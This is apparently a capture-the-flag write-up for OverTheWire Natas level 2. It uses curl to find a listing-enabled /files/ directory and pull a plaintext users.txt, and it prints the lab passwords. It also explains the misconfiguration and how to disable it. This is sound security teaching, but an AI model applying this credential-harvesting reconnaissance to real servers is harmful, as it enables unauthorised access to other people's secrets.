---
title: "OverTheWire Natas Level 2 → 3: Directory Listing and Exposed Files"
description: "Natas Level 2 hides a password inside a users.txt file in a directory with listing enabled. A missing index page and a stray image tag are all the clues you need."
date: 2026-06-04
platform: OverTheWire
difficulty: easy
tags: [ctf, web, natas, overthewire, directory-listing, information-disclosure, curl]
series: "OverTheWire Natas"
order: 2
seriesLabel: "Level 2 → 3"
draft: false
---

> Part of a complete level-by-level Natas series. Each post is self-contained — if you want context on the setup and tooling, start with the [Intro & Setup](../natas-00-introduction/) post.

## Introduction

Level 2 steps up the game. There is no HTML comment this time — or at least no comment with the password in it. The page claims there is nothing there. But the source reveals an `<img>` tag pointing to a file in a subdirectory called `files/`. When you visit that directory directly, the web server is running with directory listing enabled, meaning instead of getting a 403 Forbidden or an index page, you get a clickable list of every file in the folder. One of those files is `users.txt` — a plaintext credential store with the natas3 password sitting in plain sight.

This level teaches two related ideas: that what is "on the page" is not the same as what is "on the server," and that unprotected directories are a significant and very common real-world misconfiguration.

## Official Challenge Objective

> **There is nothing on this page** *(but there is something in a linked directory).*

## Skills Covered

- Inspecting image source paths for directory clues
- Requesting directory paths directly to test for directory listing
- Recognising Apache/nginx directory listing as a misconfiguration
- Reading plaintext credential files from an exposed directory

## My Approach

My first move was to curl the page and read every line of the HTML. The body text says "nothing here" but the `<img>` tag in the source tells a different story — it references `files/pixel.png`. That directory name is enough: I immediately hit `/files/` directly rather than `/files/pixel.png`, because a directory that contains one image might contain other files too. Apache's directory listing was enabled, so I got a full file browser. I spotted `users.txt` alongside `pixel.png`, fetched it, and the natas3 password was in the file.

## Step-by-Step Walkthrough

### Command

```bash
curl http://natas2:TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI@natas2.natas.labs.overthewire.org/
```

### Explanation

The page body says "There is nothing on this page." But reading the HTML source carefully:

```html
<html>
<head>
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
</head>
<body>
<h1>natas2</h1>
<div id="content">
There is nothing on this page
<img src="files/pixel.png">
</div>
</body>
</html>
```

The `<img src="files/pixel.png">` is the clue. There is a `files/` subdirectory on the server. I checked the image itself out of habit — it is a 1x1 transparent pixel, no EXIF metadata worth noting — but the real target is the directory, not the image.

### Why It Matters

Every external resource reference in HTML — images, scripts, stylesheets, fonts — reveals something about the server's directory structure. An attacker doing web reconnaissance spiders a site and catalogs every path they see referenced. Those paths are starting points for further directory exploration.

---

### Command

```bash
curl http://natas2:TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI@natas2.natas.labs.overthewire.org/files/
```

### Explanation

Requesting the `/files/` directory path directly. Because directory listing is enabled and there is no `index.html` or `index.php` in that folder, Apache generates an automatic directory listing page:

```html
<title>Index of /files</title>
...
<tr><td><a href="pixel.png">pixel.png</a></td><td align="right">2011-11-19 23:38</td><td align="right">303</td></tr>
<tr><td><a href="users.txt">users.txt</a></td><td align="right">2011-11-19 23:38</td><td align="right">145</td></tr>
```

Two files: `pixel.png` (the one referenced in the HTML) and `users.txt` (the interesting one). This is exactly the kind of exposed directory that turns up in real web application assessments.

### Why It Matters

Directory listing (sometimes called "directory browsing" or "directory indexing") is a web server feature that automatically generates a file browser page when a directory contains no index file. It is disabled by default in modern server configurations, but misconfigurations and legacy setups leave it enabled surprisingly often. An enabled directory listing on a production server exposes the entire contents of that directory — and any attacker who finds it will download every file immediately.

---

### Command

```bash
curl http://natas2:TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI@natas2.natas.labs.overthewire.org/files/users.txt
```

### Explanation

Fetching `users.txt` directly:

```
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```

The natas3 password is `3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH`, sitting in a plaintext credential file alongside other usernames and passwords. This is the textbook definition of a sensitive file in an unprotected location.

### Why It Matters

Plaintext credential files in web-accessible directories are a critical finding in any real assessment. This exact scenario — an old `users.txt`, a `passwords.bak`, a `.htpasswd` file, or a `credentials.json` ending up in a directory served by the web server — happens in real deployments. The combination of "directory listing enabled" and "sensitive file present" is catastrophic.

## Deep Dive: Cyber Security Concept

**Directory listing and unintended file exposure — how server misconfigurations become attack vectors.**

Directory listing is a web server feature intended for convenience in development environments. When enabled, a request for a directory path returns an HTML page listing all files in that directory, complete with file sizes and modification dates. It was common on early web servers and is still sometimes left on accidentally during server setup or migration.

The security issue is straightforward: the web server serves files the developer did not necessarily intend to publish. A database backup, a configuration file with credentials, an old version of a script, or a file meant to be internal (like our `users.txt`) can all appear in a listing-enabled directory.

The attack chain in this level: directory listing → find credential file → extract password. In real incidents this chain leads to database passwords, API keys, private certificates, and source code.

> [!IMPORTANT]
> Directory listing should be disabled on every production web server. In Apache: `Options -Indexes` in your server config or `.htaccess`. In nginx: no `autoindex on` directive. Even better: serve only files that should be public and keep everything else outside the web root.

## Offensive Security Perspective

Directory listing is one of the first things automated web scanners (nikto, dirsearch, feroxbuster, gobuster) check for. A pentester hitting a new web target runs directory enumeration as a standard recon step — and when a listing-enabled directory is found, the entire contents are immediately downloaded for offline analysis. The attacker is looking for exactly what we found here: credential files, backup files, configuration files, and anything that should not be web-accessible.

In real assessments I have found SQL database dumps, `.env` files containing API keys, private SSH keys, and internal documentation in exposed directories. The severity is always Critical because the impact is immediate and the exploitation is trivial — just a URL in a browser.

## Common Beginner Mistakes

- Looking only at the page body text and accepting "There is nothing on this page" at face value.
- Missing the `<img>` tag because it is inside a `<div>` and easy to skim past.
- Visiting `files/pixel.png` and stopping there, without trying the directory itself.
- Not recognising directory listing output as an anomaly — it looks like a normal file browser, which can make beginners think "that must be normal."

## Key Takeaways

- HTML source contains references to external resources (images, scripts) that reveal server directory structure — always check them.
- Requesting a directory path directly tests for directory listing; a 403 means listing is disabled, a file-browser page means it is enabled.
- Directory listing enabled plus a sensitive file equals a critical finding — no exploitation required beyond navigating to a URL.
- Plaintext credential files must never be web-accessible, regardless of whether the containing directory has listing enabled.
- The word "nothing" in a CTF challenge is always a lie — there is always something.

## How This Helps Build Cyber Security Expertise

- **Web recon and enumeration:** directory enumeration is a core recon step on every web assessment; recognising listing output and extracting value from it is a basic skill.
- **Misconfiguration identification:** directory listing appears in OWASP's misconfiguration category (A05:2021) and is a common finding even on mature applications.
- **Credential harvesting:** finding plaintext credentials in web-accessible files is a common lateral-movement vector in real incidents.
- **Secure deployment practices:** knowing this attack helps developers and DevOps teams audit server configurations before going live.

## Additional Reading

- [OWASP — Directory Listing (Testing Guide OTG-CONFIG-004)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/04-Review_Old_Backup_and_Unreferenced_Files_for_Sensitive_Information)
- [CWE-548 — Exposure of Information Through Directory Listing](https://cwe.mitre.org/data/definitions/548.html)
- [OWASP A05:2021 — Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
- [Apache httpd — Options directive](https://httpd.apache.org/docs/2.4/mod/core.html#options)

---

## Connect with the Author

Written by **Himangshu Pan** — cybersecurity researcher.

- **GitHub:** [@0xSh3ru](https://github.com/0xSh3ru)
- **LinkedIn:** [in/0xsh3ru](https://www.linkedin.com/in/0xsh3ru/)

*If this walkthrough helped, follow along on GitHub and connect on LinkedIn — questions and corrections are always welcome.*
